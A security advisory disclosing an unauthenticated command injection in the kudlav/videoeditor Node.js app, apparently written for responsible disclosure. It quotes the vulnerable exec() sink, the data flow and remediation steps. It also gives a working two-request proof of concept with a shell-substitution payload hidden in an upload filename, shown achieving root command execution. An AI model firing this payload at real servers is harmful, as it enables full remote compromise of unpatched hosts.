# VDR-016: Unauthenticated OS Command Injection via upload filename in kudlav/videoeditor

- **Target**: [kudlav/videoeditor](https://github.com/kudlav/videoeditor)
- **Severity**: Critical (CVSS 3.1: 9.8)
- **CWE**: [CWE-78](https://cwe.mitre.org/data/definitions/78.html) - OS Command Injection
- **CVE**: [CVE-2026-51092](https://www.cve.org/CVERecord?id=CVE-2026-51092)
- **CVSS Vector**: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
- **Discovered**: 2026-06-05
- **Researcher**: Dennis Sepede - [Securitix Solutions](https://securitixsolutions.com)

## Summary

`kudlav/videoeditor` is a web-based video editor built on the MLT framework (Node.js / Express backend). The file-upload endpoint passes the attacker-controlled multipart **filename** into a shell command without any sanitisation or quoting. An unauthenticated remote attacker can upload a file whose name contains a shell command-substitution sequence and achieve arbitrary OS command execution on the server, in the security context of the Node.js process.

The REST API has **no authentication of any kind** (`router.js` mounts every route openly), so the attack requires only network access to the listening port. The full chain is two unauthenticated HTTP requests: create a project, then upload a file with a malicious filename.

A working proof of concept was executed against the real application running under Node 16 on Linux. The injected command `id` executed server-side and produced `uid=0(root) gid=0(root) groups=0(root)`, confirming arbitrary command execution.

## Affected Component

- **Product**: videoeditor (Web Based Video Editor Using MLT Framework)
- **Version**: 3.1.0
- **Commit**: `fa4a92ab6bd6caf151c9a399bf76e46243e1c172` (2021-01-19, tip of `master`)
- **Vulnerable file**: `models/fileManager.js` (primary sink), reached from `controllers/apiController.js`
- **Endpoint**: `POST /api/project/{projectID}/file`

### Primary sink - `models/fileManager.js:21`

```js
getDuration(filepath, mimeType) {
  return new Promise((resolve, reject) => {
    if (new RegExp(/^video\//).test(mimeType) || new RegExp(/^audio\//).test(mimeType)) {
      exec(`ffmpeg -i ${filepath} 2>&1 | grep Duration | cut -d ' ' -f 4 | sed s/,// | sed s/\\./,/`, (err, stdout) => {
        // ...
```

`filepath` is interpolated directly into a string passed to `child_process.exec()`, which on Linux executes the command through `/bin/sh -c`. No shell escaping is applied.

### Source -> sink data flow - `controllers/apiController.js:245-264`

```js
busboy.on('file', (fieldname, file, filename, transferEncoding, mimeType) => {
  const fileID = nanoid();                                 // server-generated, safe
  const extension = path.extname(filename);                // <-- ATTACKER-CONTROLLED
  let filepath = path.join(config.projectPath, req.params.projectID, fileID);
  if (extension.length > 1) filepath += extension;         // attacker extension appended
  // ...
  fileManager.getDuration(filepath, mimeType).then(        // mimeType also attacker-controlled
    // ...
```

- `filename` and `mimeType` come straight from the attacker's multipart upload part.
- `fileID` is a server-side `nanoid()` (not attacker-controlled), but the **extension** derived from the attacker filename is appended to `filepath` unquoted.
- `filepath` then flows into the `exec()` sink above.

### Gate

`getDuration()` only reaches `exec()` when `mimeType` matches `^video/` or `^audio/`. The attacker fully controls the multipart `Content-Type`, so this gate is trivially satisfied by setting `Content-Type: video/mp4`.

### Precondition

The project directory must exist first. The attacker creates it with a single unauthenticated request: `POST /api/project` (`apiController.js:31`, `nanoid(32)`), which returns the `projectID`.

### Secondary sink (defence-in-depth note)

`controllers/apiController.js:215` contains a second `exec()` that interpolates a project path:

```js
exec(`cd ${projectPath} && melt project.mlt -consumer avformat:output.mp4 ...`);
```

Here `projectPath` is derived from a server-generated `nanoid(32)` project ID and is not directly attacker-controllable, so it is not the primary exploit vector, but it reflects the same unsafe `exec()`-with-string pattern used throughout the codebase and should be remediated together with the primary sink.

## Details

`child_process.exec(command)` runs `command` via the system shell (`/bin/sh -c` on Linux). Any shell metacharacters in the command string are therefore interpreted by the shell. Because the attacker-controlled file extension is concatenated into the `ffmpeg ...` command string with no quoting or escaping, a filename containing a shell command-substitution sequence such as `$(...)` causes the inner command to execute.

A subtle but important constraint governs the payload. The injected text reaches the shell only through `path.extname(filename)`. Node's `path.extname()` returns the substring from the **last** `.` to the end of the **last path segment** - it stops at the last path separator. Consequently, **any `/` in the filename truncates the returned extension to an empty string**, which neutralises the injection. The payload must therefore be **slash-free**. A reliable slash-free payload is:

```
a.$(id>PWNED_VIDEOEDITOR)
```

Here `path.extname()` returns `.$(id>PWNED_VIDEOEDITOR)`, which is appended to `filepath`. The resulting shell command becomes (conceptually):

```
ffmpeg -i WORKER/<projectID>/<fileID>.$(id>PWNED_VIDEOEDITOR) 2>&1 | grep Duration | ...
```

The `$(id>PWNED_VIDEOEDITOR)` substitution is evaluated by the shell **at parse time**, before `ffmpeg` is even invoked. As a result the command runs regardless of whether `ffmpeg` is installed on the host - the vulnerability is in the shell invocation, not in `ffmpeg`.

The command runs with the privileges of the Node.js process. In a typical containerised or default deployment that is often `root`, as demonstrated in the proof of concept.

## Proof of Concept

The PoC was run against the **real, unmodified application** running inside a `node:16-bullseye-slim` Linux container (so `child_process.exec()` uses `/bin/sh`). Dependencies were installed with `npm install --ignore-scripts` to skip only the legacy native build of the `node-sass` webpack/SCSS build dependency; the entire runtime require graph (`express`, `busboy`, `jsdom`, `rwlock`, `nanoid`, `@babel/node`, ...) and all application code were used unmodified. The only application config change was the listen port (8080 -> 18816). `ffmpeg` was intentionally absent to demonstrate that injection is independent of it.

### Step 1 - create a project (unauthenticated)

```http
POST /api/project HTTP/1.1
Host: 127.0.0.1:18816
Content-Type: application/json
Content-Length: 0
```

Response:

```json
{"project":"vL984uFGpQQEWB04woIxap-qSXzkDZbn"}
```

### Step 2 - upload a file with a malicious filename (unauthenticated)

```http
POST /api/project/vL984uFGpQQEWB04woIxap-qSXzkDZbn/file HTTP/1.1
Host: 127.0.0.1:18816
Content-Type: multipart/form-data; boundary=----videoeditorPoC

------videoeditorPoC
Content-Disposition: form-data; name="file"; filename="a.$(id>PWNED_VIDEOEDITOR)"
Content-Type: video/mp4

PoC-not-a-real-video
------videoeditorPoC--
```

Response:

```json
{"msg":"Upload of \"a.$(id>PWNED_VIDEOEDITOR)\" OK","resource_id":"S7JQ25SHQwfM0lPaiK9dH","resource_mime":"video/mp4","length":null}
```

### Step 3 - server-side proof of command execution

The injected `id>PWNED_VIDEOEDITOR` created a sentinel file on the server, written by the Node process via the `exec()` sink. Read back from the server filesystem:

```
$ ls -la /app/PWNED_VIDEOEDITOR
-rw-r--r-- 1 root root 39 Jun  5 09:38 /app/PWNED_VIDEOEDITOR

$ cat /app/PWNED_VIDEOEDITOR
uid=0(root) gid=0(root) groups=0(root)
```

The presence of the sentinel and its content - the genuine output of `id` - prove that an attacker-supplied command executed on the server with `root` privileges. The full captured transcript is in `poc/OUTPUT.txt`; the runnable exploit is `poc/exploit.js` (driven by `poc/run.sh`).

## Impact

An unauthenticated remote attacker can execute arbitrary operating-system commands on the host running `videoeditor`, in the context of the Node.js process (observed as `root` in the PoC). This yields complete compromise of confidentiality, integrity, and availability:

- Read, modify, or destroy any file accessible to the process (project media, configuration, secrets such as the SMTP credentials in `config.js`).
- Establish persistence, pivot into the internal network, or deploy malware / cryptominers.
- Disrupt or destroy the service.

Because the entire REST API is unauthenticated and the exploit needs only two ordinary HTTP requests, exploitation is trivial and reliable. This justifies the CVSS 3.1 base score of **9.8 (Critical)** with vector `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`.

## Recommendation

1. **Do not build shell command strings from user input.** Replace `child_process.exec()` with `child_process.execFile()` (or `spawn()`) and pass arguments as an array, so the filename can never be interpreted by a shell. For example, invoke `ffmpeg` as `execFile('ffmpeg', ['-i', filepath])` and perform the `grep`/`cut`/`sed` post-processing in JavaScript rather than in a shell pipeline. Apply the same fix to the secondary `melt` invocation at `apiController.js:215`.
2. **Validate and normalise the uploaded filename / extension.** Derive the stored extension from an allowlist (e.g. map the validated MIME type to a known-safe extension) rather than from the raw client-supplied filename. Reject or strip any extension containing shell metacharacters.
3. **Add authentication and authorisation** to the REST API. Every endpoint in `router.js` is currently open; project creation and file upload should require an authenticated session.
4. **Run the service with least privilege** (a dedicated unprivileged user, not `root`) to limit blast radius if a similar issue recurs.
5. **Treat `mimeType` as untrusted.** It is taken verbatim from the upload and also embedded into the project XML (`apiController.js:271`); validate it against an allowlist.

## Status

| Date | Event |
|------|-------|
| 2026-06-05 | Vulnerability discovered during source code audit |
| 2026-06-05 | Working PoC confirmed |
| TBD | CVE request submitted to MITRE CNA-LR |

## References

- [CWE-78](https://cwe.mitre.org/data/definitions/78.html)
- [Upstream repository](https://github.com/kudlav/videoeditor)
- [Node.js `child_process.exec` documentation](https://nodejs.org/api/child_process.html#child_processexeccommand-options-callback)
